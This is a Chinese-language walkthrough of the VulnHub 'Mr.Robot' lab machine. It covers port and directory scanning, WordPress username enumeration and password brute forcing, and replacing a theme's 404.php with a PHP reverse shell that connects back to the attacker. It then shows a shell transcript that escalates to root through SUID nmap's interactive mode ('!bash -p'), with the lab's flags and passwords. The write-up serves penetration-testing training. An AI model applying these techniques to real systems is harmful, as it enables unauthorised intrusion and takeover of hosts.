> 原文链接: https://www.anquanke.com//post/id/149570 


# Mr.Robot靶机实战演练


                                阅读量   
                                **163537**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01d90bcddc36488a77.jpg)](https://p4.ssl.qhimg.com/t01d90bcddc36488a77.jpg)



## 前言

靶机主题来自美剧《黑客军团》，这是一部传达极客精神和黑客文化的上佳作品，不同于《硅谷》的搞笑风格，这部剧的主角Eliot患有精神分裂，整部剧的情节都较为压抑，有点类似于电影《搏击俱乐部》中双重人格的斗争。

虽然有影视色彩的加成，但是剧中的黑客技术细节还是足够真实的，起码符合常规的入侵渗透思路，强烈推荐该剧。

本次靶机有三个flag，难度在初级到中级，非常适合新手训练学习，不需要逆向技术，目标就是找到三个key，并且拿到主机root权限。

[![](https://p2.ssl.qhimg.com/t011953b7c30e41bbae.jpg)](https://p2.ssl.qhimg.com/t011953b7c30e41bbae.jpg)



## 环境配置

靶机下载地址：[https://www.vulnhub.com/entry/mr-robot-1,151/](https://www.vulnhub.com/entry/mr-robot-1,151/)

我使用的是VMware，导入ova文件，NAT方式连接后靶机自动获取IP

本次实战：

靶机IP：192.168.128.142

攻击机IP：192.168.128.106



## 实战演练

nmap开路，IP发现：

[![](https://p5.ssl.qhimg.com/t0189bcc00a9b14376a.png)](https://p5.ssl.qhimg.com/t0189bcc00a9b14376a.png)

端口发现，服务版本探测：

`nmap -sV -O 192.168.128.142`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c1fc096355293575.png)

开启了三个端口，发现web端口：80,443

[![](https://p2.ssl.qhimg.com/t01cc24aff01fd370d3.png)](https://p2.ssl.qhimg.com/t01cc24aff01fd370d3.png)

[![](https://p3.ssl.qhimg.com/t0131be846abbde4b89.png)](https://p3.ssl.qhimg.com/t0131be846abbde4b89.png)

查看源码没有发现可用信息，用dirb跑目录：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01593b4de4a6c347f0.png)

[![](https://p0.ssl.qhimg.com/t015077494e862bb2b7.png)](https://p0.ssl.qhimg.com/t015077494e862bb2b7.png)

发现有robots.txt文件，访问[http://192.168.128.142/robots.txt](http://192.168.128.142/robots.txt)

[![](https://p1.ssl.qhimg.com/t01317a355976515ae8.png)](https://p1.ssl.qhimg.com/t01317a355976515ae8.png)

发现两个文件，访问发现第一个目录里是一个密码字典，第二个像是一个密码哈希，这是第一个key

073403c8a58a1f80d943455fb30724b9

[![](https://p3.ssl.qhimg.com/t018dbd4c06796d17fa.png)](https://p3.ssl.qhimg.com/t018dbd4c06796d17fa.png)

[![](https://p5.ssl.qhimg.com/t011bf8d9e353ccba74.png)](https://p5.ssl.qhimg.com/t011bf8d9e353ccba74.png)

[![](https://p3.ssl.qhimg.com/t01ca9963b28398dfd4.png)](https://p3.ssl.qhimg.com/t01ca9963b28398dfd4.png)

密码哈希无法爆破，字典也先放着后面用，现在用nikto扫描，看看有没有可用漏洞：

[![](https://p5.ssl.qhimg.com/t01dda8324a07153e8f.png)](https://p5.ssl.qhimg.com/t01dda8324a07153e8f.png)

发现有wordpress服务，之前dirb扫目录也发现了wordpress登录页面

[http://192.168.128.142/wp-login](http://192.168.128.142/wp-login)

[![](https://p1.ssl.qhimg.com/t019d6045c7d3aab114.png)](https://p1.ssl.qhimg.com/t019d6045c7d3aab114.png)

发现wordpress服务，用wpscan扫描网站，只有登录页面，并没有发现什么可用漏洞

[![](https://p5.ssl.qhimg.com/t0138a3a5c64afde324.png)](https://p5.ssl.qhimg.com/t0138a3a5c64afde324.png)

在登录页面随便输入之前字典中的用户，发现可以枚举用户名：

[![](https://p4.ssl.qhimg.com/t01cec9f993251105c7.png)](https://p4.ssl.qhimg.com/t01cec9f993251105c7.png)

用burp枚举出了两个用户名：

[![](https://p1.ssl.qhimg.com/t0129515e2f703b15bb.png)](https://p1.ssl.qhimg.com/t0129515e2f703b15bb.png)

用elloit作为用户名，再挂上这个字典跑密码：

[![](https://p0.ssl.qhimg.com/t01963828bb41991025.png)](https://p0.ssl.qhimg.com/t01963828bb41991025.png)

跑了好久，终于跑出密码：ER28-0652，字典实在太大了，对字典做了筛选<br>
为了截图方便就把重新跑了一遍

[![](https://p3.ssl.qhimg.com/t0179c0db64e76e7db8.png)](https://p3.ssl.qhimg.com/t0179c0db64e76e7db8.png)

接下来就是获取权限了，登陆之后，依次点击apperance&gt;editor&gt;404.php

[![](https://p1.ssl.qhimg.com/t01a06c989f6d173d13.png)](https://p1.ssl.qhimg.com/t01a06c989f6d173d13.png)

在kali找到php-reverse-shell.php，将其覆盖到404.php<br>
更改监听端口，IP

[![](https://p3.ssl.qhimg.com/t01956276f4f55addfb.png)](https://p3.ssl.qhimg.com/t01956276f4f55addfb.png)

攻击机上监听此端口，访问[http://192.168.128.142/234543658，任意不存在页面触发shell](http://192.168.128.142/234543658%EF%BC%8C%E4%BB%BB%E6%84%8F%E4%B8%8D%E5%AD%98%E5%9C%A8%E9%A1%B5%E9%9D%A2%E8%A7%A6%E5%8F%91shell)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0175763d06510ab41a.png)

执行 python -c ‘import pty; pty.spawn(“/bin/bash”)’ 获得一个更加稳定的shell

[![](https://p0.ssl.qhimg.com/t01a7498d8163699866.png)](https://p0.ssl.qhimg.com/t01a7498d8163699866.png)

接下来查看靶机密码文件：

[![](https://p3.ssl.qhimg.com/t01d03defc7511271b5.png)](https://p3.ssl.qhimg.com/t01d03defc7511271b5.png)

发现没法利用，先放一放。再看看其他目录，找到一个密码的md5散列.

[![](https://p2.ssl.qhimg.com/t01949a27da88ba2e65.png)](https://p2.ssl.qhimg.com/t01949a27da88ba2e65.png)

拿出来破解:[https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx)

abcdefghijklmnopqrstuvwxyz

[![](https://p1.ssl.qhimg.com/t01f819f1c14a2a240c.png)](https://p1.ssl.qhimg.com/t01f819f1c14a2a240c.png)

用得到的密码登录robot

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0115f2d1f50cd05687.png)

拿到第二个key，并且又拿到一个加密哈希，估计这个是root用户的密码

提升权限，但是没有成功，只能想别的办法

最后找到一个办法，用nmap执行root权限

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f7d7d85be0731e13.png)

nmap产生了一个root权限的新shell

[![](https://p1.ssl.qhimg.com/t012b93d8657a911a48.png)](https://p1.ssl.qhimg.com/t012b93d8657a911a48.png)

[![](https://p0.ssl.qhimg.com/t0111c699f76d42c06e.png)](https://p0.ssl.qhimg.com/t0111c699f76d42c06e.png)

代码如下：

```
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:/$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:/$ pwd
pwd
/
robot@linux:/$ cd /home
cd /home
robot@linux:/home$ ls
ls
robot
robot@linux:/home$ cd robot
cd robot
robot@linux:~$ ls
ls
key-2-of-3.txt password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
robot@linux:~$ find / -user root -perm -4000 2&gt;/dev/null
find / -user root -perm -4000 2&gt;/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
robot@linux:~$ /usr/local/bin/nmap —version
/usr/local/bin/nmap —version
nmap version 3.81 ( http://www.insecure.org/nmap/ )
robot@linux:~$ nmap —interactive
nmap —interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode — press h &lt;enter&gt; for help
nmap&gt; !whoami
!whoami
root
waiting to reap child : No child processes
nmap&gt; !bash -p
!bash -p
bash-4.3# whoami
whoami
root
bash-4.3# cd /root
cd /root
bash-4.3# ls -al
ls -al
total 32
drwx——— 3 root root 4096 Nov 13 2015 .
drwxr-xr-x 22 root root 4096 Sep 16 2015 ..
-rw———- 1 root root 4058 Nov 14 2015 .bash_history
-rw-r—r— 1 root root 3274 Sep 16 2015 .bashrc
drwx——— 2 root root 4096 Nov 13 2015 .cache
-rw-r—r— 1 root root 0 Nov 13 2015 firstboot_done
-r———— 1 root root 33 Nov 13 2015 key-3-of-3.txt
-rw-r—r— 1 root root 140 Feb 20 2014 .profile
-rw———- 1 root root 1024 Sep 16 2015 .rnd
bash-4.3# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
bash-4.3# ls
ls
firstboot_done key-3-of-3.txt
```

成功拿到第三个key：

04787ddef27c3dee1ee161b21670b4e4

拿到靶机root权限，game over。



## 总结

这个靶机的难度并不大，遇到的难点：

1.使用 python -c ‘import pty; pty.spawn(“/bin/bash”)’ 可以获得一个稳定的shell，这个在实际渗透中用处也很大

2.用了很多办法，一直拿不到root权限，查了很多资料发现了nmap自带的提权脚本，这个技能get

3.这个靶机只开了web端口，ssh应该也是可以触发的，大牛们可以尝试

4.思路就是通过web页面漏洞拿下了整个主机，wp提权思路也很多，大家也可以换思路渗透

[![](https://p4.ssl.qhimg.com/t011301d37b45c129c5.jpg)](https://p4.ssl.qhimg.com/t011301d37b45c129c5.jpg)



## 参考文章

[https://www.vulnhub.com/entry/mr-robot-1,151/](https://www.vulnhub.com/entry/mr-robot-1,151/)

[https://blog.christophetd.fr/write-up-mr-robot/](https://blog.christophetd.fr/write-up-mr-robot/)

[https://blog.vonhewitt.com/2017/08/mr-robot1-vulnhub-writeup/`](https://blog.vonhewitt.com/2017/08/mr-robot1-vulnhub-writeup/%60)

审核人：yiwang   编辑：少爷
